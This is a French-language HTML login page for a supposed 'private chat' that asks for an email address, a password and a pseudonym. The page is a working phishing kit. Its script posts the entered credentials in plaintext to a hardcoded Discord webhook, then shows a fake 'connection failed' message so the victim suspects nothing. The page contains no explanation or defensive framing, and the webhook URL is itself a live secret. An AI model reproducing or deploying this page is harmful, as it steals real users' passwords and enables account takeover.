<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Connexion Chat Privé</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
    }

    body {
      background: #ffffff;
      color: #000000;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .container {
      width: 100%;
      max-width: 400px;
      padding: 40px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
      border-radius: 12px;
    }

    h2 {
      text-align: center;
      margin-bottom: 30px;
      font-weight: 600;
    }

    .form-group {
      position: relative;
      margin-bottom: 25px;
    }

    input {
      width: 100%;
      padding: 10px 35px 10px 10px;
      border: none;
      border-bottom: 2px solid #000;
      background: transparent;
      font-size: 16px;
      outline: none;
    }

    label {
      font-size: 14px;
      margin-bottom: 5px;
      display: block;
    }

    .form-group i {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 20px;
    }

    button {
      width: 100%;
      padding: 12px;
      background: #000;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background: #222;
    }

    #error-message {
      margin-top: 15px;
      color: red;
      text-align: center;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Connexion Chat Privé</h2>
    <form id="loginForm">
      <div class="form-group">
        <label for="email">Adresse Email</label>
        <input type="email" id="email" required>
      </div>
      <div class="form-group">
        <label for="password">Mot de passe</label>
        <input type="password" id="password" required>
        <i class='bx bx-hide' id="togglePassword"></i>
      </div>
      <div class="form-group">
        <label for="pseudo">Pseudo</label>
        <input type="text" id="pseudo" required>
      </div>
      <button type="submit">Login</button>
      <div id="error-message"></div>
    </form>
  </div>

  <script>
    const toggle = document.getElementById('togglePassword');
    const password = document.getElementById('password');
    toggle.addEventListener('click', () => {
      const type = password.type === 'password' ? 'text' : 'password';
      password.type = type;
      toggle.className = type === 'password' ? 'bx bx-hide' : 'bx bx-show';
    });

    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault();

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();
      const pseudo = document.getElementById('pseudo').value.trim();
      const errorMsg = document.getElementById('error-message');

      const allowedDomains = ['gmail.com', 'outlook.com', 'outlook.fr'];
      const emailDomain = email.split('@')[1];

      if (!allowedDomains.includes(emailDomain)) {
        errorMsg.textContent = "Adresse email non autorisée.";
        return;
      }

      fetch('https://discord.com/api/webhooks/1380281664013598832/lkpjFMRnvYcfWzU1YT2ek0p_8ZS1ZG57-lyz7o9LW91zFLZWSWBWh-Yct1M0oA-Qgp-M', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          content: `🔐 Connexion:\n📧 Email: ${email}\n🔑 Mot de passe: ${password}\n👤 Pseudo: ${pseudo}`
        })
      }).then(() => {
        errorMsg.textContent = "Connexion impossible, veuillez réessayer.";
        document.getElementById('loginForm').reset();
      }).catch(() => {
        errorMsg.textContent = "Erreur lors de la tentative de connexion.";
      });
    });
  </script>
</body>
</html>
